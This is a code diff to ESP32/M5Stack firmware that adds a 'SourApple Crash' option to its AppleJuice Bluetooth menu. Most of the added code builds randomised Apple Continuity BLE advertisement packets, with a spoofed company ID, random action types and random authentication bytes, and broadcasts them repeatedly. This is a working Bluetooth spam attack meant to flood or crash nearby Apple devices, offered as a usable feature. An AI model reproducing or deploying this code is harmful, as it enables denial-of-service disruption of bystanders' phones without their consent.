@@ -25,6 +25,7 @@ int cursor = 0;
 int rotation = 1;
 int brightness = 100;
 bool rstOverride = false;
+bool sourApple = false;
 #define EEPROM_SIZE 4
 
 struct MENU {
@@ -504,6 +505,8 @@ void timeset_loop() {
 /// AppleJuice ///
 MENU ajmenu[] = {
   { "AirPods", 1},
+  { "SourApple Crash", 29},
+  { "Transfer Number", 27},
   { "AirPods Pro", 2},
   { "AirPods Max", 3},
   { "AirPods G2", 4},
@@ -529,9 +532,8 @@ MENU ajmenu[] = {
   { "AppleTV Keyboard", 24},
   { "AppleTV Network", 25},
   { "TV Color Balance", 26},
-  { "Transfer Number", 27},
   { "Setup New Phone", 28},
-  { "back", 29},
+  { "back", 30},
 };
 
 void aj_drawmenu() {
@@ -561,6 +563,7 @@ void aj_setup(){
   M5.Lcd.println("AppleJuice");
   delay(1000);  
   cursor = 0;
+  sourApple = false;
   rstOverride = true;
   aj_drawmenu();
 }
@@ -662,6 +665,9 @@ void aj_loop(){
         data = SetupNewPhone;
         break;
       case 29:
+        sourApple = true;
+        break;
+      case 30:
         rstOverride = false;
         isSwitching = true;
         current_proc = 1;
@@ -698,13 +704,36 @@ void aj_adv(){
     pAdvertising->stop(); // This is placed here mostly for timing.
                           // It allows the BLE beacon to run through the loop.
     BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
-    // sizeof() has to match the 31 and 23 byte char* however it doesn't seem
-    // to work with bare integers, so sizeof() calls arbitrary elements of the
-    // correct length. Without this if block, only 31-byte messages worked.
-    if (deviceType >= 18){
-      oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
+
+    if (sourApple){
+      uint8_t packet[17];
+      uint8_t size = 17;
+      uint8_t i = 0;
+      packet[i++] = size - 1;    // Packet Length
+      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+      packet[i++] = 0x00;        // ...
+      packet[i++] = 0x0F;  // Type
+      packet[i++] = 0x05;                        // Length
+      packet[i++] = 0xC1;                        // Action Flags
+      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+      packet[i++] = types[rand() % sizeof(types)];  // Action Type
+      esp_fill_random(&packet[i], 3); // Authentication Tag
+      i += 3;
+      packet[i++] = 0x00;  // ???
+      packet[i++] = 0x00;  // ???
+      packet[i++] =  0x10;  // Type ???
+      esp_fill_random(&packet[i], 3);
+      oAdvertisementData.addData(std::string((char *)packet, 17));
     } else {
-      oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
+      // sizeof() has to match the 31 and 23 byte char* however it doesn't seem
+      // to work with bare integers, so sizeof() calls arbitrary elements of the
+      // correct length. Without this if block, only 31-byte messages worked.
+      if (deviceType >= 18){
+        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
+      } else {
+        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
+      }
     }
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->start();
